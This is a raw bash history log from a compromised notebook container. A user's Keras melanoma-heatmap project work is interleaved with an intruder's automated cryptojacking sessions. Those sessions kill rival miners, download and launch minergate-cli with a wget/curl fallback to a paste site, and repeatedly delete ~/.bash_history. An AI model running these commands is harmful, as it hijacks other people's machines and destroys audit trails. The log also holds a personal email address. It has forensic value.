+exit ### root@f5e57551b879 /dev/pts/1 20161217 07:45 /root
+ pkill bash  ### root@f5e57551b879 /dev/pts/1 20161217 07:45 /root
+ pkill mine  ### root@f5e57551b879 /dev/pts/1 20161217 07:45 /root
+ pkill yam  ### root@f5e57551b879 /dev/pts/1 20161217 07:45 /root
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/1 20161217 07:45 /root
+ cd ~  ### root@f5e57551b879 /dev/pts/1 20161217 07:45 /root
+ top c  ### root@f5e57551b879 /dev/pts/1 20161217 07:45 /root
+exit ### root@f5e57551b879 /dev/pts/5 20161217 09:55 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/5 20161217 09:55 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/5 20161217 09:55 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/5 20161217 09:55 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/5 20161217 09:55 /notebooks
+ cd ~  ### root@f5e57551b879 /dev/pts/5 20161217 09:55 /root
+ top c  ### root@f5e57551b879 /dev/pts/5 20161217 09:56 /root
+exit ### root@f5e57551b879 /dev/pts/7 20161217 11:58 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/7 20161217 11:58 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/7 20161217 11:58 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/7 20161217 11:58 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/7 20161217 11:58 /notebooks
+ cd ~  ### root@f5e57551b879 /dev/pts/7 20161217 11:58 /root
+ top c  ### root@f5e57551b879 /dev/pts/7 20161217 11:58 /root
+exit ### root@f5e57551b879 /dev/pts/8 20161217 12:25 /notebooks
+exit ### root@f5e57551b879 /dev/pts/8 20161217 12:25 /notebooks
+clear ### root@f5e57551b879 /dev/pts/8 20161217 12:25 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/8 20161217 12:25 /notebooks
+clear ### root@f5e57551b879 /dev/pts/8 20161217 12:25 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/8 20161217 12:25 /notebooks
+clear ### root@f5e57551b879 /dev/pts/8 20161217 12:25 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/8 20161217 12:25 /notebooks
+kill -9 2166;  ### root@f5e57551b879 /dev/pts/8 20161217 12:25 /notebooks
+clear ### root@f5e57551b879 /dev/pts/8 20161217 12:25 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/1' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/8 20161217 12:25 /notebooks
+exit ### @f5e57551b879 not a tty 20161220 07:00 /notebooks
+exit ### @f5e57551b879 not a tty 20161220 07:01 /notebooks
+ls ### @f5e57551b879 not a tty 20161220 07:02 /notebooks
+cd ../ ### @f5e57551b879 not a tty 20161220 07:02 /notebooks -> /
+ls ### @f5e57551b879 not a tty 20161220 07:02 /
+cd datamnt/ ### @f5e57551b879 not a tty 20161220 07:02 / -> /datamnt
+ls ### @f5e57551b879 not a tty 20161220 07:02 /datamnt
+cd github/ ### @f5e57551b879 not a tty 20161220 07:02 /datamnt -> /datamnt/github
+ls ### @f5e57551b879 not a tty 20161220 07:02 /datamnt/github
+cd keras-cam-melanoma/ ### @f5e57551b879 not a tty 20161220 07:02 /datamnt/github -> /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161220 07:02 /datamnt/github/keras-cam-melanoma
+vi LOG  ### @f5e57551b879 not a tty 20161220 07:03 /datamnt/github/keras-cam-melanoma
+vi .gitignore ### @f5e57551b879 not a tty 20161220 07:03 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161220 07:03 /datamnt/github/keras-cam-melanoma
+ls -l ### @f5e57551b879 not a tty 20161220 07:04 /datamnt/github/keras-cam-melanoma
+vi .gitignore  ### @f5e57551b879 not a tty 20161220 07:05 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161220 07:05 /datamnt/github/keras-cam-melanoma
+rm .............................]  ### @f5e57551b879 not a tty 20161220 07:05 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161220 07:05 /datamnt/github/keras-cam-melanoma
+git add . ### @f5e57551b879 not a tty 20161220 07:05 /datamnt/github/keras-cam-melanoma
+git commit -a -m "git ignore and log updates" ### @f5e57551b879 not a tty 20161220 07:05 /datamnt/github/keras-cam-melanoma
+ls -lh ### @f5e57551b879 not a tty 20161220 07:06 /datamnt/github/keras-cam-melanoma
+tar -cvf bestweight.tar weights.13-loss0.225-acc0.910-valloss0.209-valacc0.907.hdf5  ### @f5e57551b879 not a tty 20161220 07:08 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161220 07:08 /datamnt/github/keras-cam-melanoma
+ls -lh ### @f5e57551b879 not a tty 20161220 07:08 /datamnt/github/keras-cam-melanoma
+rm bestweight.tar  ### @f5e57551b879 not a tty 20161220 07:08 /datamnt/github/keras-cam-melanoma
+zip bestweight.zip weights.13-loss0.225-acc0.910-valloss0.209-valacc0.907.hdf5  ### @f5e57551b879 not a tty 20161220 07:09 /datamnt/github/keras-cam-melanoma
+man gzi ### @f5e57551b879 not a tty 20161220 07:09 /datamnt/github/keras-cam-melanoma
+man gzip ### @f5e57551b879 not a tty 20161220 07:09 /datamnt/github/keras-cam-melanoma
+gzip weights.13-loss0.225-acc0.910-valloss0.209-valacc0.907.hdf5 > bestweight.gz ### @f5e57551b879 not a tty 20161220 07:10 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161220 07:10 /datamnt/github/keras-cam-melanoma
+ls -lh ### @f5e57551b879 not a tty 20161220 07:11 /datamnt/github/keras-cam-melanoma
+rm bestweight.gz  ### @f5e57551b879 not a tty 20161220 07:11 /datamnt/github/keras-cam-melanoma
+rm weights.13-loss0.225-acc0.910-valloss0.209-valacc0.907.hdf5.gz  ### @f5e57551b879 not a tty 20161220 07:11 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161220 07:15 /datamnt/github/keras-cam-melanoma
+mkdir weights.20Dec ### @f5e57551b879 not a tty 20161220 07:15 /datamnt/github/keras-cam-melanoma
+rmdir weights.20Dec ### @f5e57551b879 not a tty 20161220 07:15 /datamnt/github/keras-cam-melanoma
+mkdir archiveweights ### @f5e57551b879 not a tty 20161220 07:16 /datamnt/github/keras-cam-melanoma
+rmdir archiveweights/ ### @f5e57551b879 not a tty 20161220 07:16 /datamnt/github/keras-cam-melanoma
+mkdir archiveweights-20Dec ### @f5e57551b879 not a tty 20161220 07:16 /datamnt/github/keras-cam-melanoma
+mv weights.* archiveweights-20Dec/ ### @f5e57551b879 not a tty 20161220 07:16 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161220 07:16 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161220 07:16 /datamnt/github/keras-cam-melanoma
+git commit -a -m "20dec log" ### @f5e57551b879 not a tty 20161220 07:16 /datamnt/github/keras-cam-melanoma
+git config --global user.email "ramakrishna.r@gmail.com" ### @f5e57551b879 not a tty 20161220 07:17 /datamnt/github/keras-cam-melanoma
+git config --global user.name "Ramakrishna" ### @f5e57551b879 not a tty 20161220 07:17 /datamnt/github/keras-cam-melanoma
+git commit -a -m "20dec log" ### @f5e57551b879 not a tty 20161220 07:17 /datamnt/github/keras-cam-melanoma
+git push ### @f5e57551b879 not a tty 20161220 07:17 /datamnt/github/keras-cam-melanoma
+git push ### @f5e57551b879 not a tty 20161220 07:18 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161220 07:18 /datamnt/github/keras-cam-melanoma
+vi data.py ### @f5e57551b879 not a tty 20161220 07:18 /datamnt/github/keras-cam-melanoma
+vi model.py ### @f5e57551b879 not a tty 20161220 07:19 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161220 07:19 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161220 07:20 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161220 07:20 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161220 07:20 /datamnt/github/keras-cam-melanoma
+vi LOG  ### @f5e57551b879 not a tty 20161220 07:20 /datamnt/github/keras-cam-melanoma
+python cam.py --model_path archiveweights-20Dec/weights.14-loss0.227-acc0.910-valloss0.217-valacc0.907.hdf5 --image_path ../../train/malignant/558d609abae47801cf7343ed.jpg  ### @f5e57551b879 not a tty 20161220 07:22 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161220 07:22 /datamnt/github/keras-cam-melanoma
+python cam.py --model_path archiveweights-20Dec/weights.14-loss0.227-acc0.910-valloss0.217-valacc0.907.hdf5 --image_path ../../train/malignant/558d609abae47801cf7343ed.jpg --output_path heatmap.jpg ### @f5e57551b879 not a tty 20161220 07:23 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161220 07:23 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161220 07:23 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161220 07:23 /datamnt/github/keras-cam-melanoma
+mkdir heatmapouts ### @f5e57551b879 not a tty 20161220 07:23 /datamnt/github/keras-cam-melanoma
+python cam.py --model_path archiveweights-20Dec/weights.14-loss0.227-acc0.910-valloss0.217-valacc0.907.hdf5 --image_path ../../train/malignant/558d609abae47801cf7343ed.jpg  ### @f5e57551b879 not a tty 20161220 07:24 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161220 07:24 /datamnt/github/keras-cam-melanoma
+ls heatmapouts/ ### @f5e57551b879 not a tty 20161220 07:24 /datamnt/github/keras-cam-melanoma
+python -m SimpleHTTPServer ### @f5e57551b879 not a tty 20161220 07:25 /datamnt/github/keras-cam-melanoma
+python -m SimpleHTTPServer ### @f5e57551b879 not a tty 20161220 07:26 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161220 07:28 /datamnt/github/keras-cam-melanoma
+ls archiveweights-20Dec/ ### @f5e57551b879 not a tty 20161220 07:28 /datamnt/github/keras-cam-melanoma
+python cam.py --model_path archiveweights-20Dec/weights.05-loss0.227-acc0.910-valloss0.203-valacc0.907.hdf5 --image_path ../../train/malignant/558d609abae47801cf7343ed.jpg  ### @f5e57551b879 not a tty 20161220 07:29 /datamnt/github/keras-cam-melanoma
+python cam.py --model_path archiveweights-20Dec/weights.05-loss0.227-acc0.910-valloss0.203-valacc0.907.hdf5 --image_path ../../train/malignant/558d609abae47801cf7343ed.jpg  ### @f5e57551b879 not a tty 20161220 07:36 /datamnt/github/keras-cam-melanoma
+python cam.py --model_path archiveweights-20Dec/weights.05-loss0.227-acc0.910-valloss0.203-valacc0.907.hdf5 --image_path ../../train/malignant/558d609abae47801cf7343ed.jpg  ### @f5e57551b879 not a tty 20161220 07:36 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161220 07:37 /datamnt/github/keras-cam-melanoma
+vi model.py ### @f5e57551b879 not a tty 20161220 07:37 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161220 07:37 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161220 07:42 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161220 07:42 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161220 07:42 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161220 07:42 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161220 07:42 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161220 07:43 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161220 07:43 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161220 07:43 /datamnt/github/keras-cam-melanoma
+exit ### root@f5e57551b879 /dev/pts/0 20161220 08:10 /notebooks
+exit ### root@f5e57551b879 /dev/pts/0 20161220 08:10 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 08:11 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 08:11 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 08:11 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 08:11 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 08:11 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 08:11 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/0 20161220 08:11 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/0 20161220 08:11 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 08:11 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/0 20161220 08:11 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 08:11 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/0 20161220 08:11 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 08:12 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/0 20161220 08:12 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161220 08:12 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161220 09:40 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161220 09:40 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 09:40 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 09:40 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 09:40 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 09:40 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 09:40 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 09:40 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161220 09:40 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161220 09:40 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161220 10:59 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161220 10:59 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 11:00 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 11:00 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 11:00 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 11:00 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 11:00 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 11:00 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161220 11:00 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161220 11:00 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161220 12:24 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161220 12:24 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 12:24 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 12:24 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 12:24 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 12:24 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 12:24 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 12:24 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161220 12:24 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161220 12:24 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161220 13:29 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161220 13:29 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 13:29 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 13:29 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 13:29 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 13:29 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 13:29 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 13:29 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161220 13:29 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161220 13:29 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161220 14:35 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161220 14:35 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 14:35 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 14:35 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 14:35 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 14:35 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 14:35 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 14:35 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161220 14:35 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161220 14:35 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161220 15:40 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161220 15:40 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 15:40 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 15:40 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 15:40 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 15:40 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 15:40 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 15:40 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161220 15:40 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161220 15:40 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161220 16:43 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161220 16:43 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 16:43 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 16:43 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 16:43 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 16:43 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 16:43 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 16:43 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161220 16:44 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161220 16:44 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161220 17:50 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161220 17:50 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 17:50 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 17:51 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 17:51 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 17:51 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 17:51 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 17:51 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161220 17:51 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161220 17:51 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161220 18:56 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161220 18:56 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 18:56 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 18:56 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 18:56 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 18:56 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161220 18:56 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161220 18:56 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161220 18:56 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161220 18:56 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161221 18:32 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161221 18:32 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161221 18:32 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161221 18:32 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161221 18:32 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161221 18:32 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161221 18:32 /notebooks
